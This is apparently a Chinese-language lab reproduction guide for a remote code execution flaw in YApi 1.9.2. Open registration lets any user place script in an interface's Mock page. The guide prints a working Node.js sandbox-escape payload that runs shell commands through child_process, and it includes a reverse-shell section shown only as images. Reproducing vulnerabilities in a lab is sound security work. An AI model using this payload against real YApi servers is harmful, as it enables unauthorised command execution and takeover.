# YApi开放注册导致RCE

## 漏洞环境

执行如下命令启动一个YApi 1.9.2：

```plain
docker compose up -d
```

环境启动后，访问http://your-ip:3000即可查看到YApi首页。

## 漏洞复现

首先，注册一个用户，并创建项目和接口：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780968212509-b36c1e3f-2d4c-4205-aa88-fcea0ef82c92.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780968212572-86ee6ba7-0894-4d67-bd07-efc99e5800d0.png)

接口中有一个Mock页面可以填写代码，我们填写包含恶意命令的代码：

```plain
const sandbox = this
const ObjectConstructor = this.constructor
const FunctionConstructor = ObjectConstructor.constructor
const myfun = FunctionConstructor('return process')
const process = myfun()
mockJson = process.mainModule.require("child_process").execSync("id;uname -a;pwd").toString()
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780968212576-a2e56f08-5c3d-4407-8458-185e1b5182b6.png)

然后，回到“预览”页面可以获得Mock的URL：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780968212968-972cb563-ca84-4106-9659-6b8317f4e1ae.png)

打开这个URL，即可查看到命令执行的结果：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780968212752-6ddc296c-c0ce-47fe-badc-c4fe23e0f93a.png)

## 反弹shell

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780968213242-aff83001-8a33-42fe-b194-924e03406957.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780968213852-218dd4a1-316a-49b2-ad85-3984e2dc81d0.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780968213934-7d3cff9a-f83c-43fe-9f98-be17e897abc4.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780968214203-25a73e80-05bc-4b3d-82a3-2bcfb69150d9.png)